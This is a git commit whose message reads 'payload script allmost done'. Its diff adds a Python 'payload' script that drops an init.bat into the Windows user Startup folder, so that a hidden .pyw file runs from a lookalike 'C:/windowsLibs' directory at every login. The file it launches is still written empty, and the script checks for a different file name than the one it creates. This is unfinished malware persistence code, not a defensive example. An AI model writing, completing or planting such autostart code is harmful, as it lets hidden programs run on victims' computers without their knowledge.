1194f5a8a59bb42e85ff4e3636dfc4a32df20480
BrainFuzz-hub <failoni401@gmail.com>
2021-03-11 00:56:45 +0100

    payload script allmost done

--- code/payload.py
+++ code/payload.py
@@ -1,5 +1,24 @@
-from os import mkdir, system
-from os.path import dirname, abspath
+from os import mkdir, system, getlogin
+from os.path import exists
 
-filename = __file__
-current_path = dirname(abspath(filename))
+
+# librarry stuff:
+def libLoad():
+	mkdir("C:/windowsLibs")
+	with open("pylib.pyw", "w") as lib:
+		lib.write("")
+
+
+if not exists(f"C:/Users/{getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/init.bat"):
+
+	with open("init.bat", "w") as bat:
+		print("writing")
+		bat.write("python3 \"C:/windowsLibs\pylib.pyw\"")
+
+	system(f"move init.bat \"C:/Users/{getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/\"")
+
+elif not exists("C:/windowsLibs/pylib.py"):
+	libLoad()
+
+else:
+	print("Thinking")
